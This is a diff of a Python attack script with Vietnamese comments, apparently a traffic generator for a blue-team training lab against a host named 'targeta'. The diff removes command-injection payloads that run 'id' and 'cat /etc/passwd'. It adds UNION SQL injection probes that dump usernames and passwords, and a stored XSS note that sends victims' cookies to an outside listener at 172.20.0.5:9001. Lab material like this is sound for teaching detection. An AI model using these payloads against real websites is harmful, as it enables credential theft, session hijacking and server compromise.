@@ -1,40 +1,54 @@
 #!/usr/bin/env python3
-# Tan cong tu dong: command injection vao ping.php tren 'targeta' (he A).
-# Lien tuc ban de SIEM ghi nhan + de SV co gi ma dieu tra/va.
-import urllib.request
-import urllib.parse
-import time
+# Tan cong tu dong vao 'targeta' (he A - NoteBox): UNION SQLi o /search.php + cam mot note
+# chua Stored XSS. Chay lien tuc (tu 172.20.0.5) de SIEM/log ghi nhan cho Blue dieu tra.
+import urllib.request, urllib.parse, http.cookiejar, time
 
-TARGET = "http://targeta"
+B = "http://targeta"
 
-PAYLOADS = [
-    "/ping.php?host=127.0.0.1",                      # hop le (de so sanh)
-    "/ping.php?host=127.0.0.1;id",                   # command injection
-    "/ping.php?host=127.0.0.1;cat /etc/passwd",      # doc file
-    "/ping.php?host=127.0.0.1|id",                   # bien the pipe
-]
+def session():
+    cj = http.cookiejar.CookieJar()
+    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
 
-
-def req(path):
-    url = TARGET + urllib.parse.quote(path, safe=":/?=&")
+def get(op, path):
     try:
-        with urllib.request.urlopen(url, timeout=5) as r:
+        with op.open(B + path, timeout=5) as r:
             return r.getcode(), r.read().decode(errors="ignore")
-    except urllib.error.HTTPError as e:
-        return e.code, ""
     except Exception as e:
         return None, str(e)
 
+def post(op, path, data):
+    d = urllib.parse.urlencode(data).encode()
+    try:
+        with op.open(B + path, d, timeout=5) as r:
+            return r.getcode(), r.read().decode(errors="ignore")
+    except Exception as e:
+        return None, str(e)
 
-for _ in range(60):
-    code, _b = req("/ping.php?host=127.0.0.1")
-    if code:
+# Cho NoteBox san sang
+op = session()
+for _ in range(120):
+    c, _b = get(op, "/")
+    if c:
         break
     time.sleep(2)
 
+# Cac buoc trinh sat SQLi kinh dien (de SV thay trong log)
+recon = [
+    "'",
+    "%' ORDER BY 3 -- ",
+    "%' UNION SELECT 1,2 -- ",
+    "%' UNION SELECT version(),database() -- ",
+    "%' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- ",
+    "%' UNION SELECT username,password FROM users -- ",
+]
+xss_note = "<script>new Image().src='http://172.20.0.5:9001/?c='+document.cookie</script>"
+i = 0
 while True:
-    for p in PAYLOADS:
-        code, body = req(p)
-        hit = "uid=" in body
-        print(time.strftime("%Y-%m-%d %H:%M:%S"), "HTTP", code, "RCE" if hit else "   ", p, flush=True)
+    i += 1
+    op = session()
+    post(op, "/register.php", {"username": "mallory%d" % i, "password": "x"})     # auto-login
+    post(op, "/dashboard.php", {"title": "hello", "body": xss_note})              # cam Stored XSS
+    for p in recon:
+        get(op, "/search.php?q=" + urllib.parse.quote(p))                         # trinh sat SQLi
+    print(time.strftime("%H:%M:%S"), "attack round", flush=True)
     time.sleep(15)
